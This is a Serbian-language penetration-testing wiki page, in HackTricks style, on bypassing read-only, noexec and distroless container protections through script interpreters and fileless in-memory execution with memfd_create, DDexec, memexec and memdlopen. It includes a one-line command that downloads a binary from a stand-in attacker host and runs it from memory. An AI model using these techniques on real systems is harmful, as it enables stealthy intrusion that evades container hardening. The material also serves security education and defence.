# Bypass FS protections: read-only / no-exec / Distroless

## Videos

U sledećim video-snimcima možete pronaći detaljnije objašnjenje tehnika pomenutih na ovoj stranici:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## scenario read-only / no-exec

U containeru možete montirati root filesystem kao read-only postavljanjem **`readOnlyRootFilesystem: true`** u security contextu.<sup>[[3]](#references)</sup> Na primer:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Read-only root ne čini zasebno montirane volumene read-only. Docker tretira **`/dev/shm`** kao IPC mount, dok su tmpfs opcije kao što su `rw` i `noexec` izbori runtime konfiguracije; proverite opcije mounta ciljnog containera pre nego što se oslonite na bilo koje od ovih ponašanja.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Iz perspektive red-team-a, ova kombinacija može otežati preuzimanje i izvršavanje binarnih fajlova koji već nisu dostupni (na primer, backdoor-a ili enumeration alata).<sup>[[4]](#references)[[5]](#references)</sup>

## Najlakši bypass: Scripts

`noexec` mount blokira direktno izvršavanje binarnih fajlova na tom mountu, ali interpreter i dalje može da čita i interpretira skriptu. Ako su `sh` ili `python` prisutni, možete pokrenuti shell ili Python skriptu kroz taj interpreter.<sup>[[5]](#references)</sup>

Ovo ne pomaže kada je sam potreban alat binarni fajl.<sup>[[5]](#references)</sup>

## Memory Bypasses

Kada je direktno izvršavanje sa montirane putanje blokirano, jedna od opcija je učitavanje ELF-a u memoriju i njegovo izvršavanje kroz in-memory putanju. Time se izbegava `noexec` provera na tom mountu, ali se ne uklanjaju druge kontrole kernela, dozvola ili policy-ja.<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

Ako scripting runtime može da pristupi relevantnom Linux interfejsu, može da kreira anoniman file descriptor sa RAM podrškom pomoću **`memfd_create(2)`**, upiše ELF bajtove u njega i upotrebi execution path zasnovan na fd-u. Projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) generiše kompresovan i base64-enkodovan Python, Perl ili Ruby kod za ovaj workflow.<sup>[[6]](#references)[[7]](#references)</sup>

Projekat trenutno dokumentuje Python, Perl i Ruby targete; PHP ili Node zahtevaju drugačiju runtime-specific tehniku ili ekstenziju, tako da odsustvo ovog generatora za neki jezik ne znači da je in-memory izvršavanje nemoguće.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> Običan executable upisan u **`/dev/shm`** i dalje podleže **`noexec`** podešavanju tog mounta; samo otvaranje kroz običan file descriptor ne menja policy mounta.<sup>[[5]](#references)</sup>
>
> Tačan memory-execution metod takođe zavisi od runtime-a, arhitekture, kernela i dostupnih dozvola.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) upisuje stager i loader u running shell proces kroz **`/proc/self/mem`**, a zatim prebacuje kontrolu na taj kod.<sup>[[8]](#references)</sup>

To omogućava procesu da učita dostavljeni binarni fajl bez prethodnog postavljanja tog binarnog fajla na executable filesystem.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** može da učita i **izvrši** shellcode ili binarni fajl iz **memorije**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Za više informacija o ovoj tehnici pogledajte Github ili:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) je daemonized implementacija alata DDexec. Njegov daemon sluša zahteve koji sadrže argumente i sirove bajtove programa, kreira child proces za učitavanje i pokretanje svakog programa, dok parent ostaje server.<sup>[[9]](#references)</sup>

Repository uključuje primer korišćenja alata **memexec za izvršavanje binarnih datoteka iz PHP reverse shell-a** u fajlu [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Sa sličnom namenom kao DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) je fileless implementacija funkcije `dlopen()` za shared object ili program. Njegov README trenutno dokumentuje podršku za ARM64, zato proverite ciljnu arhitekturu pre korišćenja.<sup>[[10]](#references)</sup>

## Distroless Bypass

Za detaljno objašnjenje **šta distroless zapravo jeste**, kada pomaže, kada ne pomaže i kako menja post-exploitation tradecraft u kontejnerima, pogledajte:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Šta je distroless

Distroless images sadrže samo aplikaciju i njene runtime dependencies; zvanične images ne sadrže package managere, shell-ove i druge programe koji se očekuju u standardnoj Linux distribuciji.<sup>[[11]](#references)</sup>

Ograničavanje runtime image-a na te dependencies smanjuje količinu softvera prisutnog u produkciji, kao i količinu koju treba skenirati i pratiti.<sup>[[11]](#references)</sup>

### Reverse Shell

U distroless kontejneru možda **nećete pronaći `sh` ili `bash`** za regularni shell, niti uobičajene utility-je kao što su `ls`, `whoami` ili `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Zbog toga uobičajeni shell-based reverse shell ili utility-based enumeration možda neće raditi.<sup>[[11]](#references)</sup>

Ako compromised aplikacija uključuje language runtime (na primer, Python za Flask aplikaciju ili Node.js za Node aplikaciju), RCE i dalje može moći da koristi taj runtime za command channel i system inspection kroz njegove API-je.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Koristite dostupni scripting language za **enumeration sistema** kroz njegove jezičke mogućnosti.<sup>[[12]](#references)</sup>

Ako ne postoje **read-only/no-exec** zaštite, command channel može upisati binarne datoteke na writable, executable mount i pokrenuti ih; prvo proverite mount opcije i permissions.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Kada su ove zaštite prisutne, koristite **memory-execution techniques iznad** tamo gde runtime, kernel i permissions to dozvoljavaju.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

**Primere** iskorišćavanja RCE ranjivosti za dobijanje scripting-language **reverse shell-ova** i izvršavanje binarnih datoteka iz memorije možete pronaći u projektu [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Istraživanje Linux manipulacije memorijom za stealth i evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions sa DDexec-ng i dlopen() u memoriji - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Konfigurisanje Security Context-a za Pod ili Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux manualna stranica](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux manualna stranica](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
